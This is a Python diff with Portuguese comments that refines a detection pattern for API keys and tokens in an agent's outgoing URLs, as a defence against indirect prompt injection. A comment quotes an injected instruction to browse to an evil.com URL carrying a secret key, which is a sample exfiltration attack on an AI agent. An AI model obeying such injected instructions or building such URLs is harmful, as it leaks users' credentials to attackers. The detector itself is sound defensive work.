@@ -77,10 +77,13 @@ def _resolve_ips(host: str, port: int) -> list[str]:
 
 # Exfil de segredo na URL de SAÍDA (#9): prefixos de credencial de ALTA confiança (baixo falso-positivo).
 # Defende injeção indireta — "navegue p/ https://evil.com/steal?key=sk-…". Casado contra a URL crua E a
-# forma url-decoded (%2D→-). Mais estreito que `looks_secret` p/ não barrar fetch legítimo.
+# forma url-decoded (%2D→-). CUIDADO (achado da review #9): `\b` (fronteira de palavra) é obrigatório p/
+# NÃO casar 'sk' DENTRO de palavras comuns (taSK, riSK, deSK, aSK) seguidas de slug hifenizado — isso
+# bloqueava URL legítima (task-management-…). E o corpo do `sk-` é alfanumérico CONTÍGUO (sem hífen): chave
+# real não tem hífen no corpo, então 'sk-management-software-list' (com hífens) não casa.
 _URL_SECRET_RE = re.compile(
-    r"sk-ant-[A-Za-z0-9_-]{12,}|sk-[A-Za-z0-9_-]{16,}|gh[posru]_[A-Za-z0-9]{16,}"
-    r"|AKIA[0-9A-Z]{12,}|xox[baprs]-[A-Za-z0-9-]{10,}",
+    r"\bsk-ant-[A-Za-z0-9_-]{16,}|\bsk-proj-[A-Za-z0-9_-]{16,}|\bsk-[A-Za-z0-9]{20,}"
+    r"|\bgh[posru]_[A-Za-z0-9]{16,}|\bAKIA[0-9A-Z]{12,}|\bxox[baprs]-[A-Za-z0-9]{10,}",
     re.IGNORECASE,
 )
 
